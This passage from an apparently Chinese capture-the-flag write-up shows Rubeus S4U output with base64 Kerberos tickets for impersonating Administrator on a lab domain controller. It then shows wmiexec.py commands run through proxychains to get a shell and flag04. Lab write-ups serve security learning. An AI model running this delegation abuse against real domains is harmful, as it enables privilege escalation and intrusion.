TZAuOwBesAqPFHb7Py5bZm700Fs83murkCEFavsySBZQeVabENet39+g9l8kt7+MClRHP+SZjt29ifu71ofL1f2QLbxlm3cH6akOyoG6Mqkx2U74s2fdMwS+Ou95HObrG6DdnXpfYkoFm4ucM/OMR01nRWgoQWNkuzKONnK2PwKVCFM97+lSMZFEZ7yX/WN4NaAzWXEseJDQxiJZCPzdqx5906Z64kDJhFZzZj8Kx1U5sGLUtDnvYY1J+ns++Jmq32lIiLFLpfuyMTpWv3kTwZoFgUBvx0ylJbAUK6hzYGAP7gJTSRWoNbKDvMxxqyppdBkoZoQoxbT0VaVUpAomzH6RYbVy0C/ZZ3Cjc4aSgibUPHIE70YzL4U4JfEN5m57nOrqTMhquKAVcglO7xeYgha5pCCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCFLaW2aLSXwQbuKKTO7Ji+oQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDIzMDgwNDA3NTQyOFqmERgPMjAyMzA4MDQxNzU0MjhapxEYDzIwMjMwODExMDc1NDI4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==


[*] Action: S4U

[*] Building S4U2self request for: 'MSSQLSERVER$@XIAORANG.LAB'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2self request to 172.22.2.3:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'MSSQLSERVER$@XIAORANG.LAB'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'cifs/DC.xiaorang.lab'
[*] Building S4U2proxy request for service: 'cifs/DC.xiaorang.lab'
[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)
[*] Sending S4U2proxy request to domain controller 172.22.2.3:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/DC.xiaorang.lab':

      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
```

`dir \\DC\c$` 的时候发现拒绝访问, 然后突然想起来之前在哪看到过用 Rubeus 申请 ST 有个小坑来着, 但是忘记是哪一遍文章了 (

因为比较赶时间 (💰) 的原因索性直接把 base64 ticket 转成 ccache 然后用 wmiexec.py 连过去

```shell
export KRB5CCNAME=ticket.ccache
proxychains wmiexec.py DC.xiaorang.lab -k -no-pass -dc-ip 172.22.2.3
```

flag04

![image-20230804160007548](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041600606.png)

最后补张图, 虽然没啥用但是看起来挺酷炫的

![image-20230804160646542](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308041606608.png)